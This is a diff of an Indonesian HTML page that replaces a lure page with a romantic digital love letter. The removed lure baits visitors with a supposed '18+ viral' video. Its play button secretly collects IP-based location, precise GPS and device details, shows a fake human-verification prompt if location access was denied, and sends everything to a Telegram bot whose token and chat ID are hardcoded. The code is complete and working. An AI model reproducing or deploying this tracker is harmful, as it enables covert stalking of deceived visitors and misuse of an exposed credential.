@@ -1,261 +1,430 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Berita Terkini</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surat Untukmu</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Quicksand:wght@300;500&family=Sacramento&family=Indie+Flower&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        :root {
+            --paper-color: #fdfaf0;
+            --line-color: #e0dcc5;
+            --margin-color: #f1c1c1;
+            --text-color: #3d3d3d;
+            --pink-accent: #d63384;
+        }
 
-        /* Menambahkan background dengan gradien dan pola halus */
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #1a202c; /* Warna gelap */
-            background-image: radial-gradient(at 0% 100%, #1e3a8a 0%, transparent 50%), radial-gradient(at 100% 0%, #065f46 0%, transparent 50%);
+            background-color: #e5e5e5;
+            background-image: radial-gradient(#d1d1d1 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: var(--text-color);
+            font-family: 'Quicksand', sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
         }
 
-        /* Kelas untuk overlay semi-transparan pada gambar */
-        .video-overlay {
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
+        .paper-sheet {
+            width: 100%;
+            max-width: 450px;
+            background-color: var(--paper-color);
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 10px 10px 25px rgba(0,0,0,0.15);
+            padding: 40px 25px 60px 50px;
+            background-image: 
+                linear-gradient(var(--line-color) 1px, transparent 1px),
+                linear-gradient(90deg, var(--margin-color) 2px, transparent 2px);
+            background-size: 100% 28px, 100% 100%;
+            background-position: 0 40px, 45px 0;
+            background-repeat: repeat-y, no-repeat;
         }
 
-        /* Efek hover pada tombol play */
-        #play-btn:hover {
-            transform: scale(1.1);
+        .paper-sheet::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 15px;
+            background: white;
+            clip-path: polygon(0% 0%, 5% 100%, 10% 0%, 15% 90%, 20% 0%, 25% 100%, 30% 0%, 35% 85%, 40% 0%, 45% 100%, 50% 0%, 55% 95%, 60% 0%, 65% 100%, 70% 0%, 75% 80%, 80% 0%, 85% 100%, 90% 0%, 95% 90%, 100% 0%);
+            z-index: 5;
         }
 
-        /* Efek tekan pada tombol play */
-        #play-btn:active {
-            transform: scale(0.95);
+        .binder-holes {
+            position: absolute;
+            left: 15px;
+            top: 60px;
+            bottom: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 40px;
+            z-index: 10;
         }
 
-        /* Menghilangkan transisi pada gambar agar tidak bergetar saat hover */
-        .video-card-img {
-            transition: none;
+        .hole {
+            width: 15px;
+            height: 15px;
+            background: #e5e5e5;
+            border-radius: 50%;
+            box-shadow: inset 2px 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .heading {
+            font-family: 'Sacramento', cursive;
+            font-size: 3.5rem;
+            color: var(--pink-accent);
+            text-align: center;
+            margin-bottom: 40px;
+            line-height: 1;
+        }
+
+        .date-text {
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.2rem;
+            color: #888;
+            text-align: right;
+            margin-bottom: 20px;
+            padding-right: 10px;
+        }
+
+        .photo-polaroid {
+            background: #fff;
+            padding: 10px 10px 30px 10px;
+            box-shadow: 3px 5px 15px rgba(0,0,0,0.1);
+            margin: 35px auto;
+            width: 85%;
+            transform: rotate(-1.5deg);
+            border: 1px solid #ddd;
+            position: relative;
+        }
+
+        .photo-polaroid:nth-child(even) { transform: rotate(2deg); }
+
+        .photo-polaroid img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .washi-tape {
+            position: absolute;
+            width: 80px;
+            height: 25px;
+            background: rgba(214, 51, 132, 0.2);
+            top: -10px;
+            right: -20px;
+            transform: rotate(35deg);
+            backdrop-filter: blur(1px);
+            border: 1px dashed rgba(214, 51, 132, 0.3);
+        }
+
+        .love-paragraph {
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.4rem;
+            line-height: 28px;
+            margin: 28px 0;
+            color: #444;
+        }
+
+        .sticker-flower {
+            position: absolute;
+            font-size: 2rem;
+            filter: drop-shadow(2px 2px 0px white);
+            pointer-events: none;
+            z-index: 20;
+        }
+
+        .heart-rise {
+            position: fixed;
+            pointer-events: none;
+            z-index: 1000;
+            animation: riseUp 4s ease-out forwards;
+        }
+
+        @keyframes riseUp {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
+
+        #intro-overlay {
+            position: fixed;
+            inset: 0;
+            background: #fdfaf0;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .btn-open {
+            background: var(--pink-accent);
+            color: white;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: bold;
+            letter-spacing: 2px;
+            box-shadow: 0 5px 15px rgba(214, 51, 132, 0.4);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-open:hover { transform: scale(1.05); }
+
+        .highlight-box {
+            background: rgba(255, 255, 255, 0.5);
+            border: 1px solid var(--line-color);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.2rem;
+        }
+
+        /* Song Selector Styles */
+        .song-selector {
+            margin-bottom: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .song-option {
+            background: white;
+            border: 2px solid var(--line-color);
+            padding: 12px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9rem;
+        }
+
+        .song-option.active {
+            border-color: var(--pink-accent);
+            background: #fff0f5;
+        }
+
+        .radio-circle {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ddd;
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .song-option.active .radio-circle {
+            border-color: var(--pink-accent);
+        }
+
+        .song-option.active .radio-circle::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            background: var(--pink-accent);
+            border-radius: 50%;
         }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4 md:p-8 text-gray-100">
+<body>
 
-    <div class="max-w-xl w-full p-6 md:p-8 bg-gray-900 rounded-3xl shadow-2xl backdrop-blur-sm bg-opacity-80 border border-gray-700">
-
-        <!-- Disclaimer Text di atas video -->
-        <div class="mb-6 text-center text-gray-400 text-sm md:text-base font-light">
-           
-        </div>
-
-        <!-- Header & Title -->
-        <header class="text-center mb-8 md:mb-12">
-            <h1 class="inline-block bg-teal-600 text-white font-bold text-3xl md:text-4xl py-4 px-8 rounded-full shadow-lg tracking-wide transform -rotate-2">
-                viral 18+
-            </h1>
-            <p class="text-gray-400 mt-4 text-sm md:text-base italic">
-                video seorang wanita melakukan adegan tidak senonoh di ruang public 
-            </p>
-        </header>
-
-        <!-- Video Card -->
-        <figure class="relative w-full aspect-video rounded-3xl overflow-hidden shadow-2xl group transition-all duration-300 transform hover:scale-105">
-            <img src="https://i.ibb.co/My2BzC2c/image.png" alt="Pratinjau berita viral" class="video-card-img absolute inset-0 w-full h-full object-cover filter blur-lg transition-all duration-300" />
-            <div class="video-overlay absolute inset-0 flex items-center justify-center">
-                <button id="play-btn" class="relative z-10 w-20 h-20 md:w-24 md:h-24 rounded-full bg-white bg-opacity-30 flex items-center justify-center shadow-2xl border border-white border-opacity-30 transition-all duration-300 transform" aria-label="Putar Video">
-                    <svg class="w-10 h-10 md:w-12 md:h-12 text-white" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </button>
-            </div>
-        </figure>
-
-        <!-- Caption -->
-        <figcaption class="mt-8 text-lg md:text-xl font-semibold text-center text-gray-200 leading-relaxed">
-            yang lagi rame nih guys pria ini melakukan hal yang tidak senonoh di ruang publik dan tertekam oleh cctv
-        </figcaption>
+<div id="intro-overlay">
+    <div class="mb-8">
+        <div class="text-6xl mb-4">💌</div>
+        <h2 class="font-serif italic text-2xl text-gray-700">Pesan Untukmu</h2>
+        <p class="text-gray-400 mt-2 mb-6">Pilih lagu favoritmu lalu buka...</p>
     </div>
 
-    <!-- Modal untuk menggantikan alert -->
-    <div id="custom-alert" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black bg-opacity-60">
-        <div class="bg-gray-800 text-white p-6 rounded-lg shadow-xl text-center max-w-sm w-full">
-            <p id="alert-message" class="text-base"></p>
-            <button id="alert-ok-btn" class="mt-4 px-6 py-2 bg-teal-600 rounded-md hover:bg-teal-700 transition-colors">OK</button>
+    <!-- Pilihan Lagu -->
+    <div class="song-selector">
+        <div class="song-option active" onclick="selectSong(this, '1kDHuJbRGwTz')">
+            <div class="radio-circle"></div>
+            <span>Lagu Pertama (Utama) ♫</span>
+        </div>
+        <div class="song-option" onclick="selectSong(this, '1bxPjSrzy4Ee')">
+            <div class="radio-circle"></div>
+            <span>Lagu Kedua ♫</span>
         </div>
     </div>
 
-    <script>
-        const BOT_TOKEN = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds';
-        const CHAT_ID = '6128943834';
+    <button class="btn-open" onclick="startExperience()">BUKA SURAT</button>
+</div>
 
-        const playBtn = document.getElementById('play-btn');
+<div class="paper-sheet">
+    <div class="binder-holes">
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+        <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+    </div>
 
-        // Menggantikan fungsi alert dengan modal kustom
-        function showCustomAlert(message) {
-            const customAlert = document.getElementById('custom-alert');
-            const alertMessage = document.getElementById('alert-message');
-            const alertOkBtn = document.getElementById('alert-ok-btn');
+    <span class="sticker-flower" style="top: 50px; right: 20px;">🌸</span>
+    <span class="sticker-flower" style="top: 350px; left: 10px;">🌷</span>
+    <span class="sticker-flower" style="bottom: 150px; right: 15px;">🌹</span>
 
-            alertMessage.textContent = message;
-            customAlert.classList.remove('hidden');
+    <div class="date-text">Bandung, 18 Januari 2026</div>
+    
+    <h1 class="heading">Hai Kamu devina,</h1>
 
-            alertOkBtn.onclick = () => {
-                customAlert.classList.add('hidden');
-            };
+    <div class="love-paragraph">
+        Lewat lembaran kertas digital ini, aku ingin menuliskan sedikit dari ribuan alasan kenapa kehadiranmu begitu berarti di hidupku.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape"></div>
+        <img src="https://i.ibb.co.com/Y4Nj1168/Whats-App-Image-2026-01-15-at-20-02-51.jpg" alt="Foto Utama">
+        <p class="text-center font-serif italic mt-4 text-gray-400 text-sm">Sosok yang selalu aku kagumi...</p>
+    </div>
+
+    <div class="love-paragraph">
+        Kadang aku berpikir, bagaimana bisa aku seberuntung ini mengenalmu? Bagiku, kamu bukan sekadar seseorang, tapi tempat paling nyaman untuk berbagi cerita setelah hari yang panjang.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(135, 206, 235, 0.3);"></div>
+        <img src="https://i.ibb.co.com/zTCN6MW8/photo-2026-01-18-14-58-22-2.jpg" alt="Foto Baru 1">
+    </div>
+
+    <div class="highlight-box">
+        "Terima kasih sudah sabar menghadapiku, sudah tulus menerima segala kurangku, dan sudah memilih untuk tetap ada di sampingku."
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(135, 206, 235, 0.3);"></div>
+        <img src="https://i.ibb.co.com/gZqdjRrR/Whats-App-Image-2026-01-15-at-13-17-01.jpg" alt="Foto Kenangan">
+    </div>
+
+    <div class="love-paragraph">
+        Setiap kali aku melihatmu, hatiku selalu berkata: "Iya, kamu orangnya. Seseorang yang aku ingin ajak terus berjalan bersama, melewati setiap babak kehidupan."
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(255, 215, 0, 0.3);"></div>
+        <img src="https://i.ibb.co.com/gLXdTJgb/photo-2026-01-18-14-58-22.jpg" alt="Foto Baru 2">
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape"></div>
+        <img src="https://i.ibb.co.com/JwJYtFQm/Whats-App-Image-2026-01-13-at-22-34-17.jpg" alt="Foto Moment">
+    </div>
+
+    <div class="love-paragraph">
+        Ada begitu banyak hal kecil darimu yang tanpa sadar membuat hariku jauh lebih berwarna. Senyummu, caramu bercerita, semuanya berharga.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(144, 238, 144, 0.3);"></div>
+        <img src="https://i.ibb.co.com/wF4NrdV8/photo-2026-01-18-14-58-21-3.jpg" alt="Foto Baru 3">
+    </div>
+
+    <div class="love-paragraph">
+        Tetap bersama ya? Kita lewati setiap tantangan bareng-bareng. Aku janji bakal terus belajar untuk jadi yang terbaik bagimu.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(255, 182, 193, 0.4);"></div>
+        <img src="https://i.ibb.co.com/ccDmb4Jc/photo-2026-01-18-14-58-21-2.jpg" alt="Foto Baru 4">
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(255, 182, 193, 0.4);"></div>
+        <img src="https://i.ibb.co.com/W4ksbsGR/Whats-App-Image-2026-01-13-at-22-34-19.jpg" alt="Foto Kebahagiaan">
+    </div>
+
+    <div class="love-paragraph">
+        Kehadiranmu lebih dari sekadar kata-kata. Kamu adalah alasan di balik tawa dan syukurku setiap harinya.
+    </div>
+
+    <div class="photo-polaroid">
+        <div class="washi-tape" style="background: rgba(216, 191, 216, 0.4);"></div>
+        <img src="https://i.ibb.co.com/3y7SqBxR/photo-2026-01-18-14-58-21.jpg" alt="Foto Baru 5">
+    </div>
+
+    <div class="text-center mt-20">
+        <p class="font-serif italic text-gray-400">Selama waktuku ada,</p>
+        <p class="font-['Sacramento'] text-4xl text-pink-500 mt-2">aku di sini untukmu.</p>
+    </div>
+
+    <div class="mt-20 text-center">
+        <button onclick="rainHearts()" class="text-pink-300 hover:text-pink-500 transition-colors">
+            <span class="text-2xl">💖</span> Klik untukmu
+        </button>
+    </div>
+</div>
+
+<div style="display: none;">
+    <iframe id="audio-player" width="100%" height="60" src="" frameborder="0" allow="autoplay"></iframe>
+</div>
+
+<script>
+    let selectedSongId = '1kDHuJbRGwTz'; // Default song
+
+    function selectSong(element, id) {
+        document.querySelectorAll('.song-option').forEach(opt => opt.classList.remove('active'));
+        element.classList.add('active');
+        selectedSongId = id;
+    }
+
+    function startExperience() {
+        const overlay = document.getElementById('intro-overlay');
+        overlay.style.transition = 'opacity 1s ease';
+        overlay.style.opacity = '0';
+        
+        const player = document.getElementById('audio-player');
+        player.src = `https://vocaroo.com/embed/${selectedSongId}?autoplay=1`;
+        
+        setTimeout(() => {
+            overlay.style.display = 'none';
+        }, 1000);
+
+        rainHearts();
+    }
+
+    function rainHearts() {
+        const icons = ['❤️', '💖', '🌸', '✨', '🤍', '🌹'];
+        for(let i = 0; i < 25; i++) {
+            setTimeout(() => {
+                const h = document.createElement('div');
+                h.className = 'heart-rise';
+                h.innerHTML = icons[Math.floor(Math.random() * icons.length)];
+                h.style.left = Math.random() * 100 + 'vw';
+                h.style.fontSize = (Math.random() * 20 + 20) + 'px';
+                h.style.animationDuration = (Math.random() * 2 + 3) + 's';
+                document.body.appendChild(h);
+                setTimeout(() => h.remove(), 4000);
+            }, i * 150);
         }
+    }
 
-        // Kirim pesan ke Telegram
-        function sendToTelegram(message) {
-            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Gagal mengirim pesan ke Telegram.');
-                console.log('Pesan berhasil dikirim ke Telegram.');
-            })
-            .catch(error => console.error('Ada kesalahan saat mengirim pesan:', error));
-        }
+    setInterval(() => {
+        const p = document.createElement('div');
+        p.className = 'heart-rise';
+        p.innerHTML = '✨';
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.fontSize = '12px';
+        p.style.opacity = '0.5';
+        document.body.appendChild(p);
+        setTimeout(() => p.remove(), 5000);
+    }, 2000);
+</script>
 
-        // Format pesan gabungan lokasi GPS dan data IPAPI
-        function buildLogMessage(position, ipData) {
-            const latitude = position?.coords?.latitude?.toFixed(7) || 'N/A';
-            const longitude = position?.coords?.longitude?.toFixed(7) || 'N/A';
-
-            const userAgent = navigator.userAgent || 'N/A';
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
-            const platform = navigator.platform || 'N/A';
-            const browserLang = navigator.language || 'N/A';
-            const cpuCores = navigator.hardwareConcurrency || 'N/A';
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
-            const connectionStatus = navigator.onLine ? 'Online' : 'Offline';
-            const cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
-            const referrer = document.referrer || 'N/A';
-            const localTime = new Date().toString();
-
-            // Link lokasi Google Maps yang benar
-            const mapsLink = `http://maps.google.com/maps?q=${latitude},${longitude}`;
-
-            return `📸 Visitor Log\n\n` +
-                `🔗 Location: ${mapsLink}\n` +
-                `🌐 IP: ${ipData.ip || 'N/A'}\n` +
-                `🌍 Negara: ${ipData.country_name || 'N/A'} (${ipData.country_code || 'N/A'})\n` +
-                `🏙️ Wilayah: ${ipData.region || 'N/A'}\n` +
-                `🏠 Kota: ${ipData.city || 'N/A'}\n` +
-                `📮 Zip: ${ipData.postal || 'N/A'}\n` +
-                `🏢 Org: ${ipData.org || 'N/A'}\n` +
-                `⏰ Zona Waktu: ${ipData.timezone || 'N/A'}\n` +
-                `📍 GPS: Lat ${latitude}, Lng ${longitude}\n` +
-                `📱 Device: ${userAgent}\n` +
-                `💻 Platform: ${platform}\n` +
-                `🖥️ Screen: ${screenResolution}\n` +
-                `🌐 Browser Lang: ${browserLang}\n` +
-                `⚙️ CPU Cores: ${cpuCores}\n` +
-                `💾 RAM: ${ram}\n` +
-                `🔌 Status: ${connectionStatus}\n` +
-                `🍪 Cookies: ${cookiesEnabled}\n` +
-                `↩️ Referrer: ${referrer}\n` +
-                `🕒 Local Time: ${localTime}`;
-        }
-
-        // Pesan fallback jika lokasi GPS tidak didapat
-        function buildFallbackMessage(ipData) {
-            const userAgent = navigator.userAgent || 'N/A';
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
-            const platform = navigator.platform || 'N/A';
-            const browserLang = navigator.language || 'N/A';
-            const localTime = new Date().toString();
-
-            return `📸 Visitor Log\n\n` +
-                `⚠️ Lokasi GPS tidak diberikan atau gagal diakses.\n` +
-                `🌐 IP: ${ipData.ip || 'N/A'}\n` +
-                `🌍 Negara: ${ipData.country_name || 'N/A'} (${ipData.country_code || 'N/A'})\n` +
-                `🏙️ Wilayah: ${ipData.region || 'N/A'}\n` +
-                `🏠 Kota: ${ipData.city || 'N/A'}\n` +
-                `📮 Zip: ${ipData.postal || 'N/A'}\n` +
-                `🏢 Org: ${ipData.org || 'N/A'}\n` +
-                `⏰ Zona Waktu: ${ipData.timezone || 'N/A'}\n` +
-                `📱 Device: ${userAgent}\n` +
-                `💻 Platform: ${platform}\n` +
-                `🖥️ Screen: ${screenResolution}\n` +
-                `🌐 Browser Lang: ${browserLang}\n` +
-                `🕒 Local Time: ${localTime}`;
-        }
-
-        // Ambil data IP dan lokasi dari ipapi.co
-        async function fetchIpData() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                if (!res.ok) throw new Error('Gagal mengambil data IP');
-                return await res.json();
-            } catch (e) {
-                console.error(e);
-                return {};
-            }
-        }
-
-        // Cek status izin lokasi dan minta izin jika perlu
-        async function requestLocation() {
-            if (!navigator.geolocation) {
-                showCustomAlert('Geolocation tidak didukung browser Anda.');
-                return null;
-            }
-
-            if (navigator.permissions) {
-                try {
-                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-                    console.log('Status izin lokasi:', permissionStatus.state);
-
-                    if (permissionStatus.state === 'granted' || permissionStatus.state === 'prompt') {
-                        return new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(
-                                position => resolve(position),
-                                error => reject(error),
-                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                            );
-                        });
-                    } else if (permissionStatus.state === 'denied') {
-                        showCustomAlert('untuk memutar video anda harus memverifikasi bahwa anda manusia dengan izinkan semua pop up dari google ');
-                        return null;
-                    }
-                } catch (e) {
-                    // Jika error, coba langsung minta lokasi
-                    return new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            position => resolve(position),
-                            error => reject(error),
-                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                        );
-                    });
-                }
-            } else {
-                // Jika permissions API tidak didukung, langsung minta lokasi
-                return new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        position => resolve(position),
-                        error => reject(error),
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                });
-            }
-        }
-
-        playBtn.addEventListener('click', async () => {
-            const ipData = await fetchIpData();
-
-            try {
-                const position = await requestLocation();
-                if (position) {
-                    sendToTelegram(buildLogMessage(position, ipData));
-                } else {
-                    sendToTelegram(buildFallbackMessage(ipData));
-                }
-            } catch (error) {
-                console.warn('Gagal mendapatkan lokasi:', error.message);
-                sendToTelegram(buildFallbackMessage(ipData));
-            }
-        });
-    </script>
 </body>
 </html>
